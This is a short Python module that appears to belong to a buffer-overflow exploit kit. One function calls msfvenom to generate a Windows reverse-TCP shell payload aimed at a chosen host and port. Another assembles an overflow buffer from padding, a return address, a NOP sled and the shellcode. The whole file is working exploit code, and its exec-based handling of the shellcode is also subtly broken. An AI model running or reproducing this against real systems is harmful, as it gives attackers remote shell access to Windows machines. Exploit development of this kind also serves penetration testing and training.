import subprocess
from setup_exploit import MissingMSFModule


def generate_shellcode(ip_port: tuple, bad_chars: str) -> str:
    try:
        shell_code = subprocess.check_output(
            [f"msfvenom", "-p", "windows/shell_reverse_tcp", f"LHOST={ip_port[0]}", f"LPORT={ip_port[1]}", "-b", f'{bad_chars}', "EXEC=thread", "-f", "python"]).decode('latin1')
        exec(shell_code)
        exec("shell_code = buf")
        return shell_code

    except FileNotFoundError:
        raise MissingMSFModule("msfvenom was not found")


def exploit_buffer(shell_code: bytes, returnAddr: bytes, prefix: bytes = "", offset: int = 0) -> bytes:
    payload = prefix + b" " + b"A" * offset + \
        returnAddr + b"\x90"*16 + shell_code + b"C"*16
    return payload
